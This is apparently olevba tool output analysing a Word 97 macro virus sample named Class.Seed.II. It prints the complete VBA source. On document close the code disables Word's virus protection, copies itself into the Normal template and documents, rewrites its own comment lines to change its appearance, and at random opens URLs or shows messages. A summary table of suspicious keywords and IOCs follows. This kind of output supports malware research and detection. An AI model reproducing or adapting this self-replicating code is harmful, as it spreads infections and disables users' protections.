olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.s2-6a8d5abe39495b70aa791f00525535c9dd63a43c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.s2-6a8d5abe39495b70aa791f00525535c9dd63a43c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'221875920253746174436221875920253746174436221875920253746174436221875920253746174436
Randomize
'10201763760454631582756102017637604546315827561020176376045463158275610201763760454631582756
x = 0: o = 0
'868875842898840324529868875842898840324529868875842898840324529868875842898840324529
On Error GoTo 93
'14961424000054281078289149614240000542810782891496142400005428107828914961424000054281078289
Options.VirusProtection = False
'40354783225285407236403547832252854072364035478322528540723640354783225285407236
Options.SaveNormalPrompt = False
'111159066247196977225111159066247196977225111159066247196977225111159066247196977225
Options.ConfirmConversions = False
'1003559041003565284100100355904100356528410010035590410035652841001003559041003565284100
fx = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'11507224372914113677601115072243729141136776011150722437291411367760111507224372914113677601
xf = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'1509602232961114157641150960223296111415764115096022329611141576411509602232961114157641
If xf > 96 And fx > 0 Then GoTo 93
'423892144938282052964423892144938282052964423892144938282052964423892144938282052964
If xf < 96 Then
'21546423369135117376215464233691351173762154642336913511737621546423369135117376
    Set xs = NormalTemplate.VBProject.VBComponents.Item(1)
'2001885414433438145321200188541443343814532120018854144334381453212001885414433438145321
    ActiveDocument.VBProject.VBComponents.Item(1).Name = xs.Name
'918990649616456528089918990649616456528089918990649616456528089918990649616456528089
    ActiveDocument.VBProject.VBComponents.Item(1).Export Application.StartupPath & "seedii$.dll"
'96024994641295736809960249946412957368099602499464129573680996024994641295736809
End If
'14733007489639093989284147330074896390939892841473300748963909398928414733007489639093989284
If fx = 0 Then Set xs = ActiveDocument.VBProject.VBComponents.Item(1)
'1138657536003877054756113865753600387705475611386575360038770547561138657536003877054756
k = Int(Rnd(1) * 100) + 1
'3154140480110361000521315414048011036100052131541404801103610005213154140480110361000521
If k = 99 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.cannabisculture.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(73) + Chr(73)
'235574329612043965025235574329612043965025235574329612043965025235574329612043965025
l = Int(Rnd(1) * 75) + 1
'13754010649655582777600137540106496555827776001375401064965558277760013754010649655582777600
If l = 74 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.Microsoft.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(73) + Chr(73)
'703697645298219235600703697645298219235600703697645298219235600703697645298219235600
m = Int(Rnd(1) * 50) + 1
'11109688934415952700416111096889344159527004161110968893441595270041611109688934415952700416
If m = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(80) + Chr(82) + Chr(79) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'4542610195619056974209454261019561905697420945426101956190569742094542610195619056974209
n = Int(Rnd(1) * 25) + 1
'СкрепышИстинаЛожь8.0.4412c:\program files\microsoft office\office\startupvir.doc8.0a
If n = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(32) + Chr(73) + Chr(73)
'СкрепышИстинаЛожь8.0.4412c:\program files\microsoft office\office\startupvir.doc8.0a
xs.codemodule.AddFromFile Application.StartupPath & "seedii$.dll"
'СкрепышИстинаЛожь8.0.4412c:\program files\microsoft office\office\startupvir.doc8.0a
With xs.codemodule
'СкрепышИстинаЛожь8.0.4412c:\program files\microsoft office\office\startupvir.doc8.0a
    For p = 1 To 4
'СкрепышИстинаЛожь8.0.4412c:\program files\microsoft office\office\startupvir.doc8.0a
    .deletelines 1
'СкрепышИстинаЛожь8.0.4412c:\program files\microsoft office\office\startupvir.doc8.0a
    Next p
'СкрепышИстинаЛожь8.0.4412c:\program files\microsoft office\office\startupvir.doc8.0a
End With
'СкрепышИстинаЛожь8.0.4412c:\program files\microsoft office\office\startupvir.doc8.0a
If xf < 96 Then
'СкрепышИстинаЛожь8.0.4412c:\program files\microsoft office\office\startupvir.doc8.0a
    With xs.codemodule
'СкрепышИстинаЛожь8.0.4412c:\program files\microsoft office\office\startupvir.doc8.0a
    .replaceline 1, "Sub AutoClose()"
'СкрепышИстинаЛожь8.0.4412c:\program files\microsoft office\office\startupvir.doc8.0a
    .replaceline 99, "Sub ToolsMacro()"
'СкрепышИстинаЛожь8.0.4412c:\program files\microsoft office\office\startupvir.doc8.0a
    End With
'СкрепышИстинаЛожь8.0.4412c:\program files\microsoft office\office\startupvir.doc8.0a
End If
'СкрепышИстинаЛожь8.0.4412c:\program files\microsoft office\office\startupvir.doc8.0a
With xs.codemodule
'СкрепышИстинаЛожь8.0.4412c:\program files\microsoft office\office\startupvir.doc8.0a
    For p = 2 To 44 Step 2
'СкрепышИстинаЛожь8.0.4412c:\program files\microsoft office\office\startupvir.doc8.0a
    x = Int(Rnd(414835) * 403989) + 8485
'СкрепышИстинаЛожь8.0.4412c:\program files\microsoft office\office\startupvir.doc8.0a
    o = Int(Rnd(298368) * 235865) + 2988
'СкрепышИстинаЛожь8.0.4412c:\program files\microsoft office\office\startupvir.doc8.0a
    .replaceline p, "'" & x * x & o * o & x * x & o * o & x * x & o * o & x * x & o * o
'СкрепышИстинаЛожь8.0.4412c:\program files\microsoft office\office\startupvir.doc8.0a
Next p
'СкрепышИстинаЛожь8.0.4412c:\program files\microsoft office\office\startupvir.doc8.0a
    For xp = 46 To 98 Step 2
'СкрепышИстинаЛожь8.0.4412c:\program files\microsoft office\office\startupvir.doc8.0a
    .replaceline xp, "'" & Application.Assistant & Application.DisplayRecentFiles & Application.FocusInMailHeader & Application.Build & Application.StartupPath & Application.ActiveDocument & Application.Version
'СкрепышИстинаЛожь8.0.4412c:\program files\microsoft office\office\startupvir.doc8.0a
Next xp
'СкрепышИстинаЛожь8.0.4412c:\program files\microsoft office\office\startupvir.doc8.0a
End With
'СкрепышИстинаЛожь8.0.4412c:\program files\microsoft office\office\startupvir.doc8.0a
93:
'СкрепышИстинаЛожь8.0.4412c:\program files\microsoft office\office\startupvir.doc8.0a
If xf > 98 And fx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'СкрепышИстинаЛожь8.0.4412c:\program files\microsoft office\office\startupvir.doc8.0a
End Sub
'СкрепышИстинаЛожь8.0.4412c:\program files\microsoft office\office\startupvir.doc8.0a
Sub ToolsMacro()
'Word97/Class.Seed.II by Virus :) Smile!
End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.cannabisc|URL                                          |
|          |ulture.com          |                                             |
|IOC       |http://www.Microsoft|URL                                          |
|          |.com                |                                             |
+----------+--------------------+---------------------------------------------+
